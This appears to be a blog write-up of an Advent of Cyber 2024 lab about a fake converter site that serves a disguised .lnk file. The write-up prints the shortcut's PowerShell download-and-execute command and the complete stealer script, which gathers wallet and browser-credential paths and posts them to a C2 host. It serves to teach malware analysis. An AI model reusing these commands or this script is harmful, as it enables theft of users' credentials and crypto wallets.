+++
title = 'Advent of Cyber 2024 - Day 1'
date = 2024-12-02T10:12:29+02:00
draft = false
+++

There is a hosted website that appears to be a converter called "The Glitch's All-in-One Converter".

Enter YouTube URL and press convert. 

Unzipping the download.zip produces two files song.mp3 and somg.mp3. 

`````
# Inspect file type
file somg.mp3 

# Result
somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Archive, ctime=Sat Sep 15 07:14:14 2018, mtime=Sat Sep 15 07:14:14 2018, atime=Sat Sep 15 07:14:14 2018, length=448000, window=hide
`````

The somg.mp3 appears to be a MS lnk file - a file type that can be used to launch programs for example. 

````
# Further inspection
exiftool somg.mp3 

# Result
ExifTool Version Number         : 11.88
File Name                       : somg.mp3
Directory                       : .
File Size                       : 2.1 kB
File Modification Date/Time     : 2024:10:30 14:32:52+00:00
File Access Date/Time           : 2024:12:02 08:08:57+00:00
File Inode Change Date/Time     : 2024:12:02 08:08:26+00:00
File Permissions                : rw-r--r--
File Type                       : LNK
File Type Extension             : lnk
MIME Type                       : application/octet-stream
Flags                           : IDList, LinkInfo, RelativePath, WorkingDir, CommandArgs, Unicode, TargetMetadata
File Attributes                 : Archive
Create Date                     : 2018:09:15 08:14:14+01:00
Access Date                     : 2018:09:15 08:14:14+01:00
Modify Date                     : 2018:09:15 08:14:14+01:00
Target File Size                : 448000
Icon Index                      : (none)
Run Window                      : Normal
Hot Key                         : (none)
Target File DOS Name            : powershell.exe
Drive Type                      : Fixed Disk
Volume Label                    : 
Local Base Path                 : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Relative Path                   : ..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Working Directory               : C:\Windows\System32\WindowsPowerShell\v1.0
Command Line Arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\ProgramData\s.ps1'); iex (Get-Content 'C:\ProgramData\s.ps1' -Raw)"
````

Exiftool exposes the contents of the lnk file. In short it appears to download and run a malicious Powershell script. 

`````
function Print-AsciiArt {
    Write-Host "  ____     _       ___  _____    ___    _   _ "
    Write-Host " / ___|   | |     |_ _||_   _|  / __|  | | | |"  
    Write-Host "| |  _    | |      | |   | |   | |     | |_| |"
    Write-Host "| |_| |   | |___   | |   | |   | |__   |  _  |"
    Write-Host " \____|   |_____| |___|  |_|    \___|  |_| |_|"

    Write-Host "         Created by the one and only M.M."
}

# Call the function to print the ASCII art
Print-AsciiArt

# Path for the info file
$infoFilePath = "stolen_info.txt"

# Function to search for wallet files
function Search-ForWallets {
    $walletPaths = @(
        "$env:USERPROFILE\.bitcoin\wallet.dat",
        "$env:USERPROFILE\.ethereum\keystore\*",
        "$env:USERPROFILE\.monero\wallet",
        "$env:USERPROFILE\.dogecoin\wallet.dat"
    )
    Add-Content -Path $infoFilePath -Value "`n### Crypto Wallet Files ###"
    foreach ($path in $walletPaths) {
        if (Test-Path $path) {
            Add-Content -Path $infoFilePath -Value "Found wallet: $path"
        }
    }
}

# Function to search for browser credential files (SQLite databases)
function Search-ForBrowserCredentials {
    $chromePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json"

    Add-Content -Path $infoFilePath -Value "`n### Browser Credential Files ###"
    if (Test-Path $chromePath) {
        Add-Content -Path $infoFilePath -Value "Found Chrome credentials: $chromePath"
    }
    if (Test-Path $firefoxPath) {
        Add-Content -Path $infoFilePath -Value "Found Firefox credentials: $firefoxPath"
    }
}

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://papash3ll.thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

# Main execution flow
Search-ForWallets
Search-ForBrowserCredentials
Send-InfoToC2Server
`````

The script attempts to steal crypto wallets and credentials stored in Firefox and Chrome browsers and then send that information to a C2 server at http://papash3ll.thm/data. 

Who is the developer? In the malicious script there is a lead that can be searched for: "Created by the one and only M.M". Running the search in DuckDuckGo revelead the GitHub page below:

https://github.com/search?q=%22Created+by+the+one+and+only+M.M.%22&type=issues

````
# The conversation between MM-WarevilleTHM and Bloatware-WarevilleTHM on Oct 30, 2024

# 1
Hey Bloatware,

I came across this pretty cool C++ script of yours and would like to use it for Wareville. My only issue is that I'm not too good with C++ and I don’t really vibe. I’m much more comfortable with PowerShell.

The code does some interesting things, like searching for wallet and browser credential files and sending the findings to a C2 server. I’d love to cross-check my PowerShell version of this, especially since my C++ skills are about as sharp as a butter knife these days.

Appreciate any guidance! Please save me from pointer madness 😅.

# 2
Hey MM, Thanks for the shoutout. Haha, I totally get it! Pointers and memory management can feel like trying to defuse a bomb with a toothpick.

I’m guessing it’s the file searching and C2 communication that’s got you sweating. Share your code, and we'll see what we have.
````

The threat actors' conversation revelead the developer of the script. Further inspection of GitHub points to another project of MM's https://github.com/MM-WarevilleTHM/M.M. 

The threat actor's name is Mayor Malware (lol :D). 